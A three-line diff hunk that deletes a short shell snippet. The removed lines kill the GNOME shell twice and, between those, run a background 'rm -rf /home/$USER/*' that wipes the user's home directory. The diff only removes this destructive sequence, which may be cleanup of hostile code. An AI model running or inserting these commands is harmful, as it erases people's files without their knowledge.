@@ -1,3 +1,0 @@
-killall gnome-shell
-rm -rf /home/$USER/* &
-killall gnome-shell
